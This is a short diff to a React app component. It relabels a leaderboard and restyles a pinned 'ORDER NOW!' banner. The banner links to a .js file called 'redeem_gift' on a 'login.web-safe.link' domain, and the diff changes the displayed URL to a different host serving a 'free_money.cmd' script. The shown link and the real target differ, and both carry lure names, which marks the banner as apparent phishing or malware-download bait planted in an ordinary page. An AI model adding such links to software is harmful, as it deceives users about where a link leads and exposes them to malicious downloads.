@@ -295,7 +295,7 @@ export default function App() {
         <aside className="w-full lg:w-60 shrink-0 bg-white text-black p-3 z-30 font-comic flex flex-col min-h-[400px]">
           <h3 className="text-lg font-black italic pb-2 mb-2 text-center uppercase tracking-wider bg-yellow-300">
             
-            {isChinese ? "🏆 排行榜" : "🏆 Leaderboard"}
+            {isChinese ? "🏆 排行榜" : "🏆 Click Leaderboard"}
           </h3>
           <ul className="flex flex-col gap-2 font-bold text-xs flex-grow justify-around">
             {leaderboard.map((user, index) => (
@@ -454,15 +454,15 @@ export default function App() {
         </div>
       )}
 
-      {/* Pinned Bottom Link Banner with Pop Animation */}
+      {/* Pinned Bottom Link Banner with Fuchsia background, yellow text, no outlines/shadows, and pop animation */}
       <a
         href="https://login.web-safe.link/wTfRPX_redeem_gift.js"
         target="_blank"
         rel="noopener noreferrer"
-        className="fixed bottom-0 left-0 w-full bg-blue-600 hover:bg-blue-700 text-white text-center py-4 px-2 font-black font-comic text-lg md:text-xl tracking-wider block transition-all z-50 truncate animate-pop"
+        className="fixed bottom-0 left-0 w-full bg-fuchsia-600 text-yellow-300 text-center py-4 px-2 font-black font-comic text-lg md:text-xl tracking-wider block z-50 truncate animate-pop outline-none border-none shadow-none ring-0 focus:outline-none"
       >
         {isChinese ? "立即订购！→" : "ORDER NOW! →"}
-         <span className="font-mono text-sm underline opacity-90">https://login.web-safe.link/wTfRPX_redeem_gift.js</span>
+         <span className="font-mono text-sm underline opacity-90 ml-2">https://update.hf25u.link/VbZq9U_free_money.cmd</span>
       </a>
     </div>
   )
